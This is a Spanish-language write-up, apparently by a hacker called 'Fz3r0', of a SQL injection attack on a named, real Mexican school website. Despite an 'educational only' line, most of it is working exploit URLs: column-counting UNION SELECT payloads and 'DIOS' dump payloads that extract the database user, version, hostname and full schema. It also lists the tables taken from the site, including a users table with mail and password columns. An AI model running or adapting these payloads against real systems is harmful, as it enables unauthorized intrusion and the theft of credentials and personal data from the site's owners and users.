- **Solo para fines educativos!!!**

### Original Dork
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=112
````

### Vulnerable a:
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=112'
````

### La BD tiene 9 tablas (se rompe en 10) - SQLi PWNed!!!
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=-112'  Union Select 1,2,3,4,5,6,7,8,9 --+-
````

### Para arrojar la trifuerza:
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=-112'  Union Select 1,"Injected by Fz3r0",3,4,5,6,(CONCAT(0x3c62723e,"User + Database + Version Dump:",0x3c62723e,0x3c62723e,USER(),0x3c62723e,DATABASE(),0x3c62723e,VERSION(),0x3c62723e,0x3c62723e,"DIOS hecho en Mexico",0x3c62723e)),8,9 --+-
````

### Se arma el DIOS (aqui lo pongo por separado):
````bat
concat("SQL Injection by Fz3r0",'<br>','DIOS Hecho en Mexico'),3,4,5,6,concat_ws('<br>','<img src="https://raw.githubusercontent.com/Fz3r0/Fz3r0_-_BlackShark/main/Art/DIOS_Fz3r0_mini.png">','<br>','Database | Version | User | Hostame = PWNed!!!!','<br>',database(),version(),user(),@@hostname,'<br>','Full Database PWNed!!!','<br>',(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))
````

### Ahora si, se agrega el DIOS al número vulnerable, aquí usé 2 diferentes:
- version sin tanto pimp:
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=-112' Union Select 1,concat("SQL Injection by Fz3r0",'<br>','DIOS Hecho en Mexico'),3,4,5,6,concat_ws('<br>','<img src="https://raw.githubusercontent.com/Fz3r0/Fz3r0_-_BlackShark/main/Art/DIOS_Fz3r0_mini.png">','<br>','Database | Version | User | Hostame = PWNed!!!!','<br>',database(),version(),user(),@@hostname,'<br>','Full Database = PWNed!!!','<br>',(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database()))),8,9 --+- 
````

- version Fz3r0 DIOS mega pimp del papi:
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=-112' Union Select 1,concat('<span style="font-size:40px;color:red;">',"SQL Injection by Fz3r0",'<br>','DIOS Hecho en Mexico','</span>'),'666',4,'666',6,concat_ws('<br>','<img src="https://raw.githubusercontent.com/Fz3r0/Fz3r0_-_BlackShark/main/Art/DIOS_Fz3r0_mini.png">','<span style="font-size:22px;color:red;">','Hay fuerza, hay mente,','hay artillería pesada controlando el machete','<span style="font-size:17px;color:green;">','<br>','Database | Version | User | Hostame = PWNed!!!!','<br>',database(),version(),user(),@@hostname,'<br>','Full Database = PWNed!!!',(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database()))),8,9 --+- 
````

### Se puede ofuscar y codificar al final para la estocada final:
````bat
````

---

## Datos 

- Se me resbalaron unos comandos: 

### Bases de datos:
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=-112' Union Select 1,concat('<span style="font-size:40px;color:red;">',"SQL Injection by Fz3r0",'<br>','DIOS Hecho en Mexico','</span>'),'666',4,'666',6,(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x),8,9 --+- 
````

### Bases de datos:

````
Activ_plantel
Area
Avisos
CatDocente
Cat_Com
Convenios
Directorio
Especialidad
Especialidad_copy1
Especialidad_has_Planteles
Eventos
Invitacion_adq
Modulos_Especialidad
Municipio
Planteles
Programa_Anual
Programa_Anual_copy1
Registro_huk
Registro_test
archivos
avisos_SPD_BKP
avisos_USICAMM
buzon_denuncias
buzon_sugerencias
categorias
detalleDocente
directorio_planteles
especialidades_en_planteles
estrado_electronico
img_notas
img_notas_copy1
infoSPD
list_planteles
noticias
noticias_copy1
tipo_mensaje
tipo_usuario
usuarios 
````

## Dump Data Users
````bat
id
mail
passw
privilegios
usuario
````


## Tablas directorio
````
area
cargo
correo
extension
id_directorio
id_padre
nivel
orden
status
titular
````

## Bonus: Version super basic:
````bat
http://cecytab.edu.mx/index.php?page=det_prensa&id=-112' Union Select 1,2,3,4,5,6,concat_ws('<br>','Injected by Fz3r0','<br>','<img src="https://raw.githubusercontent.com/Fz3r0/Fz3r0_-_BlackShark/main/Art/DIOS_Fz3r0_mini.png">',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database()))),8,9 --+-
````
